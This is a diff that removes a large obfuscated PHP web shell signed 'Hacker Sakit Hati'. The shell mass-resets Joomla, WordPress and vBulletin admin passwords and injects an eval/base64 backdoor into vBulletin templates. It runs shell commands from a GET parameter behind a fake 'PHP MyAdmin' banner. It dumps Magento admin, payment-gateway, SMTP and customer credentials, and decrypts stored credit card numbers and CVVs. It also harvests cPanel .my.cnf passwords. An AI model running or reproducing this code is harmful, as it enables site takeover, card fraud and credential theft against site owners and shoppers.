-$x11a = @mysql_connect('localhost',$x115,$x114);
-
-$x116 = @mysql_select_db($x116,$x11a);
-
-$x11b = @mysql_query("UPDATE `$x119` SET `username` ='HsH'");
-
-
-$x11c = @mysql_query("UPDATE `$x119` SET `password` ='44a0bcda611514625ba94e0b1c0bdaed:2iets9ydjR3iOdSuyvW54pIzyF9M1P5J'");
-
-
-if ($x11b and $x11c ){$x11d = '<b style="color: #006600">Succeed </b>user [ HsH ] pass [1]</b>';}else{$x11d = '<b style="color:red">failed</b>';}
-
-$x112 = trim($x111).'';
-
-echo "<tr>
-<td><a target='_blank' href='http://$x112'>$x111</a></td>
-<td><a target='_blank' href='$x110'>config</a></td><td>".$x11d."</td></tr>";
-flush();
-
-
-
-}else{
-
-echo "<tr>
-<td><a target='_blank' href='http://$x112'>$x111</a></td>
-<td><a target='_blank' href='http://$x10e'>config</a></td><td><b style='color:red'>failed</b></td></tr>";
-flush();
-
-}
-
-}
-
-
-
-
-
-
-
-
-
-die();
-
-}
-
-if(!is_file('named.txt')){
-
-$xff = @file("/etc/named.conf");
-
-flush();
-
-
-}else{
-
-$xff = file("named.txt");
-
-
-}
-if(!$xff)
-{
-
-die ("<meta http-equiv='refresh' content='0; url=?sws=read'/>");
-}
-else
-
-{
-echo "<div class='tmp'>
-<form method='POST' action='$xfe?sws=joomla'>
-<input type='submit' value='Mass ching Admin' />
-<input type='hidden' value='1' name='s' />
-</form><br /><br />
-<table align='center' width='40%'><td> Domains </td><td> config </td><td> Result </td>";
-
-$xfd = fopen('joomla.txt','w');
-
-foreach($xff as $x100){
-
-if(eregi("zone",$x100)){
-
-preg_match_all('#zone "(.*)"#', $x100, $x101);
-
-if(strlen(trim($x101[1][0])) > 2){
-
-$x102 = posix_getpwuid(@fileowner("/etc/valiases/".$x101[1][0]));
-
-///////////////////////////////////////////////////////////////////////////////////
-
-$x11e=$xf9."/sym/root/home/".$x102['name']."/public_html/configuration.php";
-$x11f=get_headers($x11e);
-$x120=$x11f[0];
-
-$x121=$xf9."/sym/root/home/".$x102['name']."/public_html/blog/configuration.php";
-$x122=get_headers($x121);
-$x123=$x122[0];
-
-$x124=$xf9."/sym/root/home/".$x102['name']."/public_html/joomla/configuration.php";
-$x125=get_headers($x124);
-$x126=$x125[0];
-
-
-////////// joomla ////////////
-
-$x46 = strpos($x120, "200");
-$x110="&nbsp;";
-
-if (strpos($x120, "200") == true )
-{
-$x110= $x11e;
-}
-elseif (strpos($x123, "200") == true)
-{
-$x110= $x121;
-}
-elseif (strpos($x126, "200") == true)
-{
-$x110= $x124;
-}
-else
-{
-continue;
-
-}
-flush();
-
-/////////////////////////////////////////////////////////////////////////////////////
-
-$x100 = $x101[1][0];
-
-$x109 = fwrite($xfd,"$x110||$x100 \n");
-if($x109){$x11d = '<b style="color: #006600">Save</b>';}else{$x11d = '<b style="color:red">failed</b>';}
-
-
-echo "<tr><td><a href=http://www.".$x101[1][0].">".$x101[1][0]."</a></td>
-<td><a href='$x110'>config</a></td><td>".$x11d."</td></tr>";
-
-
-
-
-
-flush();
-
-
-}
-}
-}
-}
-
-
-break;
-
-case 'wp':
-
-############################ index #########################3
-
-
-
-
-
-
-######## admin ##########33
-
-if(isset($_POST['s'])){
-
-$x29 = @file_get_contents('WaniPiro.txt');
-
-$x10d = explode("\n",$x29);
-
-echo "<div class='tmp'><table align='center' width='40%'><td> domin </td><td> config </td><td> Result </td>";
-flush();
-flush();
-
-
-foreach ($x10d as $x10e){
-
-$x10f = explode("||",$x10e);
-
-$x110 = $x10f[0];
-
-$x111 = $x10f[1];
-
-$x112 = trim($x111).'';
-
-$x113 = @file_get_contents(trim($x110));
-
-if(ereg('wp-settings.php',$x113)){
-
-
-
-$x114 = ex($x113,"define('DB_PASSWORD', '","');");
-
-$x115 = ex($x113,"define('DB_USER', '","');");
-
-$x116 = ex($x113,"define('DB_NAME', '","');");
-
-$x117 = ex($x113,'$x127 = \'',"';");
-
-$x119 = $x117.'users';
-
-$x11a = @mysql_connect('localhost',$x115,$x114);
-
-$x116 = @mysql_select_db($x116,$x11a);
-
-$x11b = @mysql_query("UPDATE `$x119` SET `user_login` ='HsH'") or die;
-
-$x11b = @mysql_query("UPDATE `$x119` SET `user_pass` ='$1$4z/.5i..$9aHYB.fUHEmNZ.eIKYTwx/'") or die;
-
-
-
-if ($x11b){$x11d = '<b style="color: #006600">Succeed </b>user [ HsH ] pass [1]</b>';}
-
-else
-
-{
-
-$x11d = '<b style="color:red">failed</b>';
-
-}
-
-$x112 = trim($x111).'';
-
-echo "<tr>
-<td><a target='_blank' href='http://$x112'>$x111</a></td>
-<td><a target='_blank' href='$x110'>config</a></td><td>".$x11d."</td></tr>";
-
-flush();
-flush();
-
-
-
-
-
-
-}else{
-
-echo "<tr>
-<td><a target='_blank' href='http://$x112'>$x111</a></td>
-<td><a target='_blank' href='http://$x110'>config</a></td><td><b style='color:red'>failed2</b></td></tr>";
-
-flush();
-flush();
-
-}
-
-}
-
-
-
-
-
-
-
-
-
-
-die();
-
-}
-
-if(!is_file('named.txt')){
-
-$xff = @file("/etc/named.conf");
-
-}else{
-
-$xff = @file("named.txt");
-
-
-}
-if(!$xff)
-{
-
-die ("<meta http-equiv='refresh' content='0; url=?sws=read'/>");
-}
-else
-
-{
-echo "<div class='tmp'>
-<form method='POST' action='$xfe?sws=wp'>
-<input type='submit' value='Mass Change Admin' />
-<input type='hidden' value='1' name='s' />
-</form>
-<br /><br />
-<table align='center' width='40%'><td> Domains </td><td> config </td><td> Result </td>";
-
-flush();
-flush();
-
-$xfd = fopen('wp.txt','w');
-
-foreach($xff as $x100){
-
-if(eregi("zone",$x100)){
-
-preg_match_all('#zone "(.*)"#', $x100, $x101);
-
-if(strlen(trim($x101[1][0])) > 2){
-
-$x102 = posix_getpwuid(@fileowner("/etc/valiases/".$x101[1][0]));
-
-///////////////////////////////////////////////////////////////////////////////////
-
-$x11e=$xf9."/sym/root/home/".$x102['name']."/public_html/wp-config.php";
-$x11f=get_headers($x11e);
-$x120=$x11f[0];
-
-$x121=$xf9."/sym/root/home/".$x102['name']."/public_html/blog/wp-config.php";
-$x122=get_headers($x121);
-$x123=$x122[0];
-
-$x124=$xf9."/sym/root/home/".$x102['name']."/public_html/wp/wp-config";
-$x125=get_headers($x124);
-$x126=$x125[0];
-
-
-////////// wp ////////////
-
-$x46 = strpos($x120, "200");
-$x110="&nbsp;";
-
-if (strpos($x120, "200") == true )
-{
-$x110= $x11e;
-}
-elseif (strpos($x123, "200") == true)
-{
-$x110= $x121;
-}
-elseif (strpos($x126, "200") == true)
-{
-$x110= $x124;
-}
-else
-{
-continue;
-
-}
-flush();
-
-/////////////////////////////////////////////////////////////////////////////////////
-
-$x100 = $x101[1][0];
-
-$x109 = fwrite($xfd,"$x110||$x100 \n");
-if($x109){$x11d = '<b style="color: #006600">Save</b>';}else{$x11d = '<b style="color:red">failed</b>';}
-
-
-echo "<tr><td><a href=http://www.".$x101[1][0].">".$x101[1][0]."</a></td>
-<td><a href='$x110'>config</a></td><td>".$x11d."</td></tr>";
-flush();
-flush();
-
-
-
-
-
-flush();
-
-
-}
-}
-}
-}
-
-
-break;
-
-
-case 'vb':
-
-
-if(isset($_POST['s'])){
-
-
-
-$x29 = @file_get_contents('vb.txt');
-
-$x10d = explode("\n",$x29);
-
-echo "<div class='tmp'><table align='center' width='40%'><td> domin </td><td> config </td><td> Result </td>";
-
-
-foreach ($x10d as $x10e){
-
-$x10f = explode("||",$x10e);
-
-$x110 = $x10f[0];
-
-$x111 = $x10f[1];
-
-$x112 = trim($x111).'';
-
-$x113 = @file_get_contents(trim($x110));
-
-if(ereg('vBulletin',$x113)){
-
-
-
-$x116 = ex($x113,'$x110[\'Database\'][\'dbname\'] = \'',"';");
-
-$x115 = ex($x113,'$x110[\'MasterServer\'][\'username\'] = \'',"';");
-
-$x114 = ex($x113,'$x110[\'MasterServer\'][\'password\'] = \'',"';");
-
-$x11a = @mysql_connect('localhost',$x115,$x114);
-
-$x116 = @mysql_select_db($x116,$x11a);
-
-$x128 = "bVDPS8MwFL4L/g+vYZAWdPPiaUv14kAQFKqnUUqapjSYNKFJxCn7322abgzcIfDyvl+P7/qKs04D3tS5sJ96MMJ9b+ohDw8vTWcq31PF02yJp/WqzvEaZk2rBwWUOaF7ghAo7jrdEGS0dQh4z9zecIKUl04YOrhV4N821FEEwZQgb6SmDR8QiObsdxYheuMdRKNWSH5UxtmKn3G+v0P5TIxgNTqhWWR9rYSLAXH/RaUfgY8pbVROZ4VI0aawqN5ei/cdDlRcAiFwJEIGv4HyyLTZp4tq+/zyVOxwOASXO+yUqUI6Lm/gHxiBLDic6o62UHjGuLWQJEko99T9Gg7ApeUXJFsq5EX+AR7yPw==" ;
-
-$x129 = "{\${eval(gzinflate(base64_decode(\'";
-
-$x129 .= "$x128";
-
-$x129 .= "\')))}}{\${exit()}}</textarea>";
-
-$x12a = "UPDATE template SET template ='".$x129."' WHERE title ='FAQ'" ;
-
-$x11b = @mysql_query($x12a,$x11a);
-
-
-
-if ($x11b){$x11d = '<b style="color: #006600">Succeed</b> shell in search.php';}
-
-else
-
-{
-
-$x11d = '<b style="color:red">failed</b>';
-
-}
-
-$x112 = trim($x111).'';
-
-echo "<tr>
-<td><a target='_blank' href='http://$x112'>$x111</a></td>
-<td><a target='_blank' href='$x110'>config</a></td><td>".$x11d."</td></tr>";
-
-
-
-
-
-
-
-}else{
-
-echo "<tr>
-<td><a target='_blank' href='http://$x112'>$x111</a></td>
-<td><a target='_blank' href='http://$x110'>config</a></td><td><b style='color:red'>failed2</b></td></tr>";
-}
-
-}
-
-
-
-
-
-
-
-
-
-
-die();
-
-}
-
-if(!is_file('named.txt')){
-
-$xff = file("/etc/named.conf");
-
-}else{
-
-$xff = file("named.txt");
-
-
-}
-if(!$xff)
-{
-
-die ("<meta http-equiv='refresh' content='0; url=?sws=read'/>");
-}
-else
-
-{
-echo "<div class='tmp'>
-<form method='POST' action='$xfe?sws=vb'>
-<input type='submit' value='Inject shell' />
-<input type='hidden' value='1' name='s' />
-</form>
-<br /><br />
-<table align='center' width='40%'><td> Domains </td><td> config </td><td> Result </td>";
-
-$xfd = fopen('vb.txt','w');
-
-foreach($xff as $x100){
-
-if(eregi("zone",$x100)){
-
-preg_match_all('#zone "(.*)"#', $x100, $x101);
-
-if(strlen(trim($x101[1][0])) > 2){
-
-$x102 = posix_getpwuid(@fileowner("/etc/valiases/".$x101[1][0]));
-
-///////////////////////////////////////////////////////////////////////////////////
-
-$x11e=$xf9."/sym/root/home/".$x102['name']."/includes/config.php";
-$x11f=get_headers($x11e);
-$x120=$x11f[0];
-
-$x121=$xf9."/sym/root/home/".$x102['name']."/vb/includes/config.php";
-$x122=get_headers($x121);
-$x123=$x122[0];
-
-$x124=$xf9."/sym/root/home/".$x102['name']."/forum/includes/config.php";
-$x125=get_headers($x124);
-$x126=$x125[0];
-
-
-////////// vb ////////////
-
-$x46 = strpos($x120, "200");
-$x110="&nbsp;";
-
-if (strpos($x120, "200") == true )
-{
-$x110= $x11e;
-}
-elseif (strpos($x123, "200") == true)
-{
-$x110= $x121;
-}
-elseif (strpos($x126, "200") == true)
-{
-$x110= $x124;
-}
-else
-{
-continue;
-
-}
-flush();
-
-/////////////////////////////////////////////////////////////////////////////////////
-
-$x100 = $x101[1][0];
-
-$x109 = fwrite($xfd,"$x110||$x100 \n");
-if($x109){$x11d = '<b style="color: #006600">Save</b>';}else{$x11d = '<b style="color:red">failed</b>';}
-
-
-echo "<tr><td><a href=http://www.".$x101[1][0].">".$x101[1][0]."</a></td>
-<td><a href='$x110'>config</a></td><td>".$x11d."</td></tr>";
-
-
-
-
-
-flush();
-
-
-}
-}
-}
-}
-
-
-
-
-
-
-
-
-break;
-
-case 'help':
-
-echo "<div class='tmp'>
-<table align='center' width='40%'><td>function</td><td>Case</td>";
-
-
-$x12b = ini_get('safe_mode');
-if($x12b){$x11d = "<b style='color: red'>False</b>";}else{$x11d = "<b style='color: #336600'>True</b>";}
-
-echo "<tr><td>Safe Mode</td><td>$x11d</td>";
-
-$x12c = function_exists('symlink');
-if(!$x12c){$x11d = "<b style='color: red'>False</b>";}else{$x11d = "<b style='color: #336600'>True</b>";}
-
-echo "<tr><td>function symlink</td><td>$x11d</td>";
-
-
-$x12c = function_exists('file');
-if(!$x12c){$x11d = "<b style='color: red'>False</b>";}else{$x11d = "<b style='color: #336600'>True</b>";}
-
-echo "<tr><td>function file</td><td>$x11d</td>";
-
-$x12c = function_exists('file_get_contents');
-if(!$x12c){$x11d = "<b style='color: red'>False</b>";}else{$x11d = "<b style='color: #336600'>True</b>";}
-
-echo "<tr><td>function file_get_contents</td><td>$x11d</td>";
-
-$x12c = function_exists('mkdir');
-if(!$x12c){$x11d = "<b style='color: red'>False</b>";}else{$x11d = "<b style='color: #336600'>True</b>";}
-
-echo "<tr><td>function mkdir</td><td>$x11d</td>";
-
-
-$x12c = is_dir('sym/root');
-if(!$x12c){$x11d = "<b style='color: red'>False</b>";}else{$x11d = "<b style='color: #336600'>True</b>";}
-
-echo "<tr><td>Permission denied</td><td>$x11d</td>";
-
-
-$x12c = preg_match('/Forbidden/',@file_get_contents('sym/root') or !@file_get_contents('sym/root'));
-if($x12c){$x11d = "<b style='color: red'>False</b>";}else{$x11d = "<b style='color: #006600'>True</b>";}
-
-echo "<tr><td>Forbidden</td><td>$x11d</td>";
-
-
-
-
-echo "</table></div>";
-
-
-
-break;
-default:
-header("Location: $xfe");
-
-
-
-
-}
-
-
-
-echo '
-<br /><br /><br>';
-
-}
-
-
-function ex($x12d,$x12e,$x16){
-$x12f = explode($x12e,$x12d);
-$x12f = explode($x16,$x12f[1]);
-return $x12f[0];
-}
-
-
-
-echo '</div>
-
-
-
-
-
-</body>
-
-</html></center>
-';
-	echo'<body bgcolor="black" >
-	<center>
-	<br>
-	<FORM action=""  method="post">
-	<div align="center"><br>
-	<div align="center">============================[    PHP MyAdmin    ]============================<br><br>
-	<input type="hidden" name="form_action" value="2">
-	</div>
-	</div>
-	';
-	if($_GET['HsH']){echo"<pre>".shell_exec($_GET["HsH"]);}
-	if(file_exists($_SERVER['DOCUMENT_ROOT'].'/app/etc/local.xml')){
-		$x130 = simplexml_load_file($_SERVER['DOCUMENT_ROOT'].'/app/etc/local.xml');
-		if(isset($x130->global->resources->default_setup->connection)) {
-		   $x95 = $x130->global->resources->default_setup->connection;
-		   $x131 = $x130->global->resources->db->table_prefix;
-		   $x13 = $x130->global->crypt->key; //f8cd1881e3bf20108d5f4947e60acfc1
-		   require_once $_SERVER['DOCUMENT_ROOT'].'/app/Mage.php';
-		   
-		   try {
-			   $x132 = Mage::app('default');
-			   Mage::getSingleton('core/session', array('name'=>'frontend'));
-		   }catch(Exception $x53) { echo 'Message: ' .$x53->getMessage()."<br/>\n";}
-
-		   if (!mysql_connect($x95->host, $x95->username, $x95->password)){
-			   print("Could not connect: " . mysql_error());
-		   }
-		   mysql_select_db($x95->dbname);
-		   echo $x95->host."|".$x95->username."|".$x95->password."|".$x95->dbname."| $x131 | $x13<br/>\n";
-
-		$x133 = new Varien_Crypt_Mcrypt();
-		$x133->init($x13);
-
-		//=========================================================================================================
-		$x11b = mysql_query("SELECT user_id,firstname,lastname,email,username,password FROM admin_user where is_active = '1'");
-		if (!$x11b){
-			  echo "<center><b>Gagal</b></center>";
-		}else{
-				$xf4 = mysql_fetch_array(mysql_query("SELECT value as website FROM core_config_data WHERE path='web/unsecure/base_url'"));
-			  echo'<br><br>
-					====================================================================<br>
-									[ Admin websitenya : '.$xf4['website'].'] <br>
-					====================================================================<br>';
-		}
-		echo "
-		<table border='1' align='center' >
-		<tr>
-		<td>id</td>
-		<td>firstname</td>
-		<td>lastname</td>
-		<td>email</td>
-		<td>username</td>
-		<td>password</td>
-		</tr>";
-			while($x134 = mysql_fetch_array($x11b)) {
-			$x135 = 1;
-			$x136 = $x134['user_id'];
-			$x3a = $x134['username'];
-			$x3b = $x134['password'];
-			$x137 = $x134['email'];
-			$x138 = $x134['firstname'];
-			$x139 = $x134['lastname'];
-			echo "<tr><pre><td>$x136</td><td>$x138</td><td>$x139</td><td>$x137</td><td>$x3a</td><td>$x3b</td></pre></tr>";
-			} 
-		echo "</table><br>";
-		//=========================================================================================================
-		$x11b = mysql_query("SELECT value as user,(SELECT value FROM core_config_data where  path = 'payment/authorizenet/trans_key') as pass FROM core_config_data where path = 'payment/authorizenet/login'");
-		if(mysql_num_rows($x11b) != 0){
-			if (!$x11b){
-				  echo "<center><b>Gagal</b></center>";
-			}else{
-				  echo'<br><br>
-						====================================================================<br>
-										[ Authorizenet ] <br>
-						====================================================================<br>';
-			}
-			echo "
-			<table border='1' align='center' >
-			<tr>
-			<td>no</td>
-			<td>user</td>
-			<td>pass</td>	
-			</tr>";
-				$x135 = 1;
-				while($x134 = mysql_fetch_array($x11b)) {
-				$x102 = $x133->decrypt($x134['user']);
-				$x114 = $x133->decrypt($x134['pass']);
-
-				
-				echo "<tr><pre><td>$x135</td><td>$x102</td><td>$x114</td></pre></tr>";
-				$x135++;
-				} 
-			echo "</table><br>";
-		}
-		//=========================================================================================================
-		$x13a = mysql_query("SELECT (SELECT a.value FROM core_config_data as a WHERE path = 'system/smtpsettings/host') as host , (SELECT b.value FROM core_config_data as b WHERE path = 'system/smtpsettings/port') as port,(SELECT c.value FROM core_config_data as c WHERE path = 'system/smtpsettings/username') as user ,(SELECT d.value FROM core_config_data as d WHERE path = 'system/smtpsettings/password') as pass FROM core_config_data limit 1,1");
-		if(mysql_num_rows($x13a) != 0){
-			if (!$x13a){
-				  echo "<center><b>Gagal</b></center>";
-			}else{
-				  echo'<br><br>
-						====================================================================<br>
-										[ SMTP ] <br>
-						====================================================================<br>';
-			}
-			echo "
-			<table border='1' align='center' >
-			<tr>
-			<td>no</td>
-			<td>host</td>		
-			<td>port</td>
-			<td>user</td>
-			<td>pass</td>	
-			</tr>";
-				$x135 = 1;
-				$x13b = 0;
-				while($x13c = mysql_fetch_array($x13a)) {
-					$x13d = $x13c[0];
-					$x13e = $x13c[1];
-					$x13f = $x13c[2];
-					$x140 = $x13c[3];
-					echo "<tr><pre><td>$x135</td><td>$x13d</td><td>$x13e</td><td>$x13f</td><td>$x140</td></pre></tr>";
-					$x135++;
-				}
-			echo "</table><br>";
-		}
-		//=========================================================================================================
-		$x11b = mysql_query("SELECT sfo.updated_at,sfo.cc_owner,sfo.method,sfo.cc_number_enc,sfo.cc_cid_enc,CONCAT(sfo.cc_exp_month,' |',sfo.cc_exp_year) as exp,CONCAT(billing.firstname,' | ',billing.lastname,' | ',billing.street,' | ',billing.city,' | ', billing.region,' | ',billing.postcode,' | ',billing.country_id,' | ',billing.telephone,' |-| ',billing.email) AS 'Billing Address' FROM sales_flat_quote_payment AS sfo JOIN sales_flat_quote_address AS billing ON billing.quote_id = sfo.quote_id AND billing.address_type = 'billing'");
-		$x141 = mysql_query("SELECT sfo.cc_owner,sfo.method,sfo.cc_number_enc,sfo.cc_cid_status,CONCAT(sfo.cc_exp_month,'|',sfo.cc_exp_year) as exp,CONCAT(billing.firstname,' | ',billing.lastname,' | ',billing.street,' | ',billing.city,' | ', billing.region,' | ',billing.postcode,' | ',billing.country_id,' | ',billing.telephone,' | ',billing.email) AS 'Billing Address' FROM sales_flat_order_payment AS sfo JOIN sales_flat_order_address AS billing ON billing.parent_id = sfo.parent_id AND billing.address_type = 'billing' where cc_number_enc != ''");
-		if(mysql_num_rows($x11b) != 0 || mysql_num_rows($x141) != 0){
-			  echo'<br><br>
-					====================================================================<br>
-									[ Credit Card ] <br>
-					====================================================================<br>';
-				echo "
-				<table border='1' align='left' >
-				<tr>
-				<td>no</td>
-				<td>Date</td>
-				<td>Credit Owner</td>
-				<td>method</td>
-				<td>Credit Number</td>
-				<td>Credit Exp</td>
-				<td>CVV</td>
-				<td>Address</td>
-				</tr>";
-					$x135 = 1;
-					$x13b = 0;
-					while($x134 = mysql_fetch_array($x11b)){
-					$x142 = $x134['updated_at'];
-					$x143 = $x134['cc_owner'];
-					$x144 = $x134['method'];
-					$x145 = $x133->decrypt($x134['cc_number_enc']);
-					$x10e = $x134['exp'];		
-					$x146 = $x133->decrypt($x134['cc_cid_enc']);	
-					$x147 = $x134['Billing Address'];
-					echo "<tr><pre><td>$x135</td><td>$x142</td><td>$x143</td><td>$x144</td><td>$x145</td><td>$x10e</td><td>$x146</td><td>$x147</td></pre></tr>";
-					$x13b = $x135++;
-					}
-					
-					while($x148 = mysql_fetch_array($x141)){
-						$x13b +=1;
-					$x143 = $x148['cc_owner'];
-					$x144 = $x148['method'];
-					$x145 = $x133->decrypt($x148['cc_number_enc']);
-					$x10e = $x148['exp'];		
-					$x149 = $x133->decrypt($x148['cc_cid_status']);
-					$x147 = $x148['Billing Address'];
-					echo "<tr><pre><td>$x13b</td><td>$x143</td><td>$x144</td><td>$x145</td><td>$x10e</td><td>$x149</td><td>$x147</td></pre></tr>";
-					 $x13b++;
-					}	 
-					
-				echo "</table><br>";	
-		}
-		//=========================================================================================================
-		$x11b = mysql_query("SELECT email,value FROM customer_entity_varchar, customer_entity WHERE customer_entity_varchar.entity_id = customer_entity.entity_id and attribute_id=12");
-		$x141 = mysql_query("SELECT customer_email,password_hash FROM sales_flat_quote");
-		
-		
-		if(mysql_num_rows($x11b) != 0 || mysql_num_rows($x141) != 0 ){
-			if (!$x11b){
-				  echo "<center><b>Gagal</b></center>";
-			}else{
-				  echo'<br><br>
-						====================================================================<br>
-										[ Customer ] <br>
-						====================================================================<br>';
-			}
-			echo "
-			<table border='1' align='center' >
-			<tr>
-			<td>no</td>
-			<td>user</td>
-			<td>pass</td>	
-			</tr>";
-				$x135 = 1;
-				$x13b = 0;
-				while($x134 = mysql_fetch_array($x11b)) {
-					$x102 = $x134['email'];
-					$x114 = $x134['value'];
-					echo "<tr><pre><td>$x135</td><td>$x102</td><td>$x114</td></pre></tr>";
-					$x13b = $x135++;
-				} 
-				
-				if(mysql_num_rows($x141) != 0 && ($x141)){
-					while($x148 = mysql_fetch_array($x141)){
-						$x102 = $x148['customer_email'];
-						$x114 = $x133->decrypt($x148['password_hash']);
-						if(!empty($x102) && !empty($x114)){ //tampilin ketika datanya itu ada klo gk ada ya jangan di tampiin 
-							$x13b +=1;
-							echo "<tr><pre><td>$x13b</td><td>$x102</td><td>$x114</td></pre></tr>";
-							$x13b++;
-						}
-					}				
-				}
-			
-			echo "</table><br>";
-		}
-		//=========================================================================================================
-	  }
-	}
-	function save($x14a,$x10){
-		$xb2 = fopen($x14a, 'a');
-		fwrite($xb2, $x10);
-		fclose($xb2);
-	}
-	function cekbase64($x15){ 
-			$x14b = base64_decode($x15, true);
-			if (!preg_match('/^[a-zA-Z0-9\/\r\n+]*={0,2}$/', $x15)) return false;
-			if(!base64_decode($x15, true)) return false;
-			if(base64_encode($x14b) != $x15) return false;
-			return true;//nilai return 1 jika true
-		}
-	//----untuk decode password ---/
-	class Varien_Crypt_Mcrypt{
-		/**
-		 * Constuctor
-		 *
-		 * @param array $x10
-		 */
-		public function __construct()
-		{
-		}
-
-		/**
-		 * Initialize mcrypt module
-		 *
-		 * @param string $x13 cipher private key
-		 * @return Varien_Crypt_Mcrypt
-		 */
-		public function init($x13)
-		{
-			$this->handler = mcrypt_module_open(MCRYPT_BLOWFISH, '', MCRYPT_MODE_ECB, '');
-			$x14c = mcrypt_create_iv (mcrypt_enc_get_iv_size($this->handler), MCRYPT_RAND);
-			$x14d = mcrypt_enc_get_key_size($this->handler);
-
-			if (iconv_strlen($x13, 'UTF-8')>$x14d) {
-				//throw new Varien_Exception('Maximum key size must should be smaller '.$x14d);
-				return null;
-			}
-
-			mcrypt_generic_init($this->handler, $x13, $x14c);
-
-			return $this;
-		}
-
-		/**
-		 * Encrypt data
-		 *
-		 * @param string $x10 source string
-		 * @return string
-		 */
-		public function encrypt($x10)
-		{
-			if (!$this->handler) {
-				//throw new Varien_Exception('Crypt module is not initialized.');
-				return null;
-			}
-			if (strlen($x10) == 0) {
-				return $x10;
-			}
-			return base64_encode(mcrypt_generic($this->handler, $x10));
-		}
-
-		/**
-		 * Decrypt data
-		 *
-		 * @param string $x10 encrypted string
-		 * @return string
-		 */
-		public function decrypt($x10)
-		{
-			if (!$this->handler) {
-				//throw new Varien_Exception('Crypt module is not initialized.');
-				return null;
-			}
-			if (strlen($x10) == 0) {
-				return $x10;
-			}
-			return mdecrypt_generic($this->handler, base64_decode($x10));
-		}
-			
-	 
-		/**
-		 * Desctruct cipher module
-		 *
-		 */
-		public function __destruct()
-		{
-			if ($this->handler) {
-				$this->_reset();
-			}
-		}
-
-		protected function _reset()
-		{
-			mcrypt_generic_deinit($this->handler);
-			mcrypt_module_close($this->handler);
-		}
-	}
-
-
-//******************************************************************************//
-
-	set_time_limit(0);
-	error_reporting(0);
-
-	if(get_magic_quotes_gpc()){
-	foreach($_POST as $x13=>$x14){
-	$_POST[$x13] = stripslashes($x14);
-	}
-	}
-	echo '
-	<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
-	<tr><td>Lokasi : ';
-if ( isset($_GET['CpC']) )
-{
-/**
-					Hacked By Hacker Sakit Hati
-
-		_  _ ____ ____ _  _ ____ ____ ____ ____ _  _ _ ___ _  _ ____ ___ _ 
-		|__| |__| |    |_/  |___ |__/ [__  |__| |_/  |  |  |__| |__|  |  | 
-		|  | |  | |___ | \_ |___ |  \ ___] |  | | \_ |  |  |  | |  |  |  | 
-                                                               			   
-
-*/
-
-@ini_set('display_errors',0);
-function entre2v2($x12d,$x14e,$x14f,$x8c=1){
-    $x150=explode($x14e, $x12d);
-    $x151=explode($x14f, $x150[$x8c]);
-    return trim($x151[0]);
-}
-
-echo '<html><head>
-<title>HsH Cpanel</title>
-<meta content="text/html; charset=utf-8">
-<style>
-body,table{background:  ; font-family:Verdana,tahoma; color: lime ; font-size:10px }
-A:link {text-decoration: none;color: darkviolet;}
-A:active {text-decoration: none;color: aqua;}
-A:visited {text-decoration: none;color: aqua;}
-A:hover {text-decoration: underline; color: Fuchsia;}
-#new,input,table,td,tr,#gg{border-style:solid;text-decoration:bold ;}
-input:hover,tr:hover,td:hover{background-color:  ; color: aqua;}
-</style>
-<link rel="SHORTCUT ICON" href="http://i48.servimg.com/u/f48/16/08/07/74/indone10.gif"><center> 
-</head><body>';
-echo '<div style="font-family: Iceland;font-size: 35pt;text-shadow: 0 0 66px darkviolet, 0 0 5px darkviolet, 0 0 5px darkviolet;color: silver">..::[+  cPanel Open Server +]::.. <br /><sub>Hacker Sakit Hati</sub></div><br/>';
-
-
-$x152 = @file('/etc/named.conf');
-$x153 = scandir("/var/named");
-
-if ($x153 or $x152)
-{
-    $x153 = scandir("/var/named");
-    if($x153) {
-echo "<table align='center'><tr><th> No </th><th> Website </th><th> User </th><th> Password </th><th> Hasil </th></tr>";
-$x154=1;
-$x155 = 0;
-$x4b = scandir("/var/named");
-foreach($x4b as $x156){
-if(strpos($x156,".db")){
-$x156 = str_replace('.db','',$x156);
-$x157 = posix_getpwuid(fileowner("/etc/valiases/".$x156));
-$x158 = '/home/'.$x157['name'].'/.my.cnf';
-$xb7 = getcwd();
-
-if (is_readable($x158)) {
-copy($x158, ''.$xb7.'/'.$x157['name'].'.txt');
-$x159=file_get_contents(''.$xb7.'/'.$x157['name'].'.txt');
-$x3b=entre2v2($x159,'password="','"');
-echo "<tr><td>".$x154++."</td><td><a href='http://".$x156.":/cpanel' target='_blank'>".$x156."</a></td><td>".$x157['name']."</td><td>".$x3b."</td><td><a href='".$x157['name'].".txt' target='_blank'> Silahkan Dibuka </a></td></tr>";
-$x155++;
-}
-
-}
-}
-echo '</table>'; 
-$x15a = $x155;
-echo '<br><div class="result">Total cPanel Yang Ketemu = '.$x15a.'</h3><br />';
-echo '</center>';
-}else{
-$x152 = @file('/etc/named.conf');
-    if($x152) {
-echo "<table align='center'><tr><th> No </th><th> Website </th><th> User </th><th> Password </th><th> Hasil </th></tr>";
-$x154=1;
-$x155 = 0;
-$x15b = array();
-foreach($x152 as $x15c){
-    if(@eregi('zone',$x15c)){
-        preg_match_all('#zone "(.*)"#',$x15c,$x156);
-        flush();
-        if(strlen(trim($x156[1][0])) >2){
-            $x15b[] = $x156[1][0];
-        }
-    }
-}
-$x15b = array_unique($x15b);
-$x15d = array();
-$x15e = array();
-foreach($x15b as $x15f) {
-    $x160 = @posix_getpwuid(fileowner("/etc/valiases/".$x15f));
-    $x15d[] = $x160['name'];
-    $x15e[] = $x15f;
-}
-array_multisort($x15d,$x15e);
-$x161 = file('/etc/passwd');
-$x162 = array();
-foreach($x161 as $x163) {
-    $x11d = explode(':',$x163);
-    if(strpos($x11d[5],'home')) {
-        $x162[$x11d[0]] = $x11d[5];
-    }
-}
-$x4a=0;
-$x164=1;
-foreach($x15d as $x11d) {
-$x158 = '/home/'.$x11d.'/.my.cnf';
-$xb7 = getcwd();
-if (is_readable($x158)) {
-copy($x158, ''.$xb7.'/'.$x11d.'.txt');
-$x159=file_get_contents(''.$xb7.'/'.$x11d.'.txt');
-$x3b=entre2v2($x159,'password="','"');
-echo "<tr><td>".$x154++."</td><td><a target='_blank' href=http://".$x15e[$x164-1].'/>'.$x15e[$x164-1].' </a></td><td>'.$x11d."</td><td>".$x3b."</td><td><a href='".$x11d.".txt' target='_blank'> Silahkan Dibuka </a></td></tr>";
-$x155++;
-                flush();
-                $x4a=$x4a?0:1;
-                $x164++;
-				}
-            }
-			}
-echo '</table>'; 
-$x15a = $x155;
-echo '<br><div class="result">Total cPanel Yang Ketemu = '.$x15a.'</h3><br />';
-echo '</center>';
-
-}
-}else{
-echo '<center>';
